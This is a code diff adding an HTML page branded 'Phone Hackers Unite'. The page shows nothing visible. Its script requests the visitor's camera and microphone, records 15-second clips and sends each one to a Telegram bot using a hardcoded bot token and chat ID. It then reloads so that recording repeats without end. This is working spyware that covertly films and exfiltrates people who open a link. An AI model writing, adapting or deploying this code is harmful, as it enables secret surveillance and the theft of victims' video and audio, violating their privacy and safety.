@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+
+    <script>
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        const chatId = '6769491364';
+        // Access the device camera and microphone and start recording
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(stream => {
+                startRecording(stream);
+            });
+
+        // Start recording video with audio
+        function startRecording(stream) {
+            mediaRecorder = new MediaRecorder(stream);
+
+            // Store the recorded chunks
+            mediaRecorder.ondataavailable = function(event) {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
+
+            // When recording stops, send the video to the Telegram bot
+            mediaRecorder.onstop = function() {
+                const videoBlob = new Blob(recordedChunks, { type: 'video/mp4' });
+                sendVideoToTelegram(videoBlob);
+                recordedChunks = []; // Clear the recorded chunks
+            };
+
+            // Start recording
+            mediaRecorder.start();
+
+            // Stop recording and send video after a set duration (e.g., 10 seconds)
+            setTimeout(() => {
+                mediaRecorder.stop();
+            }, 15000); // 10,000 milliseconds = 10 seconds
+        }
+
+
+        function sendVideoToTelegram(videoBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('video', videoBlob, 'video.mp4');
+
+           const caption = 'Developed By: Md. Fahim Sarker\nImage Forwarded: Phone Hackers Unite';
+           const keyboard = JSON.stringify({
+             inline_keyboard: [
+           [{ text: 'Open Phone Hackers Unite', url: 'https://t.me/PhoneHackersUnite_bot' }],
+           [{ text: 'Developer Info', url: 'https://md-fahim-sarker.github.io/My-About/' }]
+      ]
+    });
+
+    formData.append('caption', caption);
+    formData.append('reply_markup', keyboard);
+
+            // Send the video to the Telegram bot
+            fetch(`https://api.telegram.org/bot6310109803:AAHUt4ZUHhqyqrG4Ld50A6gb4LxGZgE8LXQ/sendVideo`, {
+                method: 'POST',
+                body: formData
+            })
+                .then(response => response.json())
+                .then(result => {
+                    location.reload();
+                })
+        }
+    </script>
+</body>
+</html>
